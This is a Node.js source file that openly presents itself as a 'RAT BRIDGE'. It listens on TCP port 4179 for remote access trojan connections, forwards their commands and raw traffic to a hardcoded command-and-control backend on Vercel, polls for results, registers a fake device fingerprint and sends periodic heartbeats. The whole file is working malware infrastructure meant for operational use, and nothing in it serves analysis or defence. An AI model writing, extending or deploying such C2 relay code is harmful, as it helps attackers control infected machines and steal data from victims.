// ============================================================
//  RAT BRIDGE — TCP to HTTPS Converter
//  Forwards RAT traffic to Vercel backend
//  Port: 4179  |  Backend: https://c2-vercel-backend.vercel.app
// ============================================================

const net = require('net');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

// ============================================================
//  CONFIG — HARDCODED FOR YOUR SETUP
// ============================================================
const TCP_PORT = 4179;
const BACKEND_URL = 'https://c2-vercel-backend.vercel.app';
const DEVICE_ID = 'bridge_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);

// ============================================================
//  REGISTER BRIDGE WITH BACKEND
// ============================================================
async function registerBridge() {
    try {
        const url = `${BACKEND_URL}/api/register`;
        console.log(`[Bridge] Registering at: ${url}`);
        
        const response = await axios.post(url, {
            fingerprint: {
                platform: 'Windows Bridge',
                ip: '0.0.0.0',
                screen: '1920x1080',
                timezone: 'UTC',
                cpuCores: '4',
                deviceMemory: '8',
                canvasFingerprint: 'bridge-' + Date.now()
            },
            permissions: {}
        });
        
        console.log('[Bridge] ✅ Registered with backend');
        console.log('[Bridge] Device ID:', DEVICE_ID);
        console.log('[Bridge] Response:', response.data);
    } catch (e) {
        console.error('[Bridge] ❌ Registration failed:', e.message);
        if (e.response) {
            console.error('[Bridge] Status:', e.response.status);
            console.error('[Bridge] Data:', e.response.data);
        }
        // Retry after 5 seconds
        setTimeout(registerBridge, 5000);
    }
}

// ============================================================
//  TCP SERVER — LISTEN FOR RAT CONNECTIONS
// ============================================================
const server = net.createServer((socket) => {
    const clientId = uuidv4().slice(0, 8);
    console.log(`[${clientId}] 🔗 RAT connected from ${socket.remoteAddress}:${socket.remotePort}`);

    socket.on('data', async (data) => {
        const raw = data.toString('hex');
        console.log(`[${clientId}] 📥 RX: ${raw.substring(0, 100)}${raw.length > 100 ? '...' : ''}`);

        try {
            const message = data.toString('utf8').trim();
            if (message) {
                // Try to parse as JSON first
                try {
                    const json = JSON.parse(message);
                    await handleCommand(clientId, json, socket);
                } catch {
                    // If not JSON, treat as raw command
                    await handleRawCommand(clientId, message, socket);
                }
            }
        } catch (e) {
            console.error(`[${clientId}] ❌ Error:`, e.message);
            socket.write('ERROR\n');
        }
    });

    socket.on('close', () => {
        console.log(`[${clientId}] 🔌 RAT disconnected`);
    });

    socket.on('error', (err) => {
        console.log(`[${clientId}] ❌ Socket error:`, err.message);
    });
});

// ============================================================
//  HANDLE JSON COMMANDS
// ============================================================
async function handleCommand(clientId, command, socket) {
    try {
        console.log(`[${clientId}] 📤 Sending command:`, command);
        
        const response = await axios.post(`${BACKEND_URL}/api/send-command`, {
            deviceId: DEVICE_ID,
            command: JSON.stringify(command)
        });

        if (response.data && response.data.commandId) {
            console.log(`[${clientId}] ✅ Command sent, ID: ${response.data.commandId}`);
            
            // Poll for result
            const result = await pollResult(clientId, response.data.commandId);
            if (result) {
                const responseData = JSON.stringify(result);
                socket.write(responseData + '\n');
                console.log(`[${clientId}] 📤 TX: ${responseData.substring(0, 100)}...`);
            } else {
                socket.write('TIMEOUT\n');
            }
        }
    } catch (e) {
        console.error(`[${clientId}] ❌ Command error:`, e.message);
        socket.write('ERROR: Failed to process command\n');
    }
}

// ============================================================
//  HANDLE RAW COMMANDS
// ============================================================
async function handleRawCommand(clientId, raw, socket) {
    try {
        console.log(`[${clientId}] 📤 Sending raw command: ${raw}`);
        
        const response = await axios.post(`${BACKEND_URL}/api/send-command`, {
            deviceId: DEVICE_ID,
            command: raw
        });

        if (response.data && response.data.commandId) {
            const result = await pollResult(clientId, response.data.commandId);
            if (result) {
                const output = result.output || result.error || 'OK';
                socket.write(output + '\n');
                console.log(`[${clientId}] 📤 TX: ${output.substring(0, 100)}...`);
            } else {
                socket.write('TIMEOUT\n');
            }
        }
    } catch (e) {
        console.error(`[${clientId}] ❌ Error:`, e.message);
        socket.write('ERROR\n');
    }
}

// ============================================================
//  POLL FOR COMMAND RESULT
// ============================================================
async function pollResult(clientId, commandId, timeout = 30000) {
    const start = Date.now();
    let attempts = 0;
    
    while (Date.now() - start < timeout) {
        attempts++;
        try {
            const resp = await axios.get(`${BACKEND_URL}/api/device-details?deviceId=${DEVICE_ID}`);
            const results = resp.data.results || [];
            const found = results.find(r => r.command_id === commandId);
            if (found) {
                console.log(`[${clientId}] ✅ Result found after ${attempts} attempts`);
                return found;
            }
            await new Promise(r => setTimeout(r, 1000));
        } catch (e) {
            console.error(`[${clientId}] ❌ Poll error:`, e.message);
        }
    }
    console.log(`[${clientId}] ⏰ Result timeout after ${attempts} attempts`);
    return null;
}

// ============================================================
//  START TCP SERVER
// ============================================================
server.listen(TCP_PORT, '0.0.0.0', () => {
    console.log(`[Bridge] 🚀 TCP server listening on port ${TCP_PORT}`);
    console.log(`[Bridge] 🔗 Forwarding to: ${BACKEND_URL}`);
    console.log(`[Bridge] 🆔 Device ID: ${DEVICE_ID}`);
    console.log(`[Bridge] 📡 Waiting for RAT connections...`);
});

// ============================================================
//  HEARTBEAT — Keep device alive
// ============================================================
setInterval(async () => {
    try {
        await axios.post(`${BACKEND_URL}/api/heartbeat`, { deviceId: DEVICE_ID });
        console.log('[Bridge] 💓 Heartbeat sent');
    } catch (e) {
        // Silent fail
    }
}, 30000);

// ============================================================
//  REGISTER ON STARTUP
// ============================================================
registerBridge();

// ============================================================
//  HANDLE PROCESS EXIT
// ============================================================
process.on('SIGINT', () => {
    console.log('[Bridge] 👋 Shutting down...');
    server.close(() => {
        process.exit(0);
    });
});
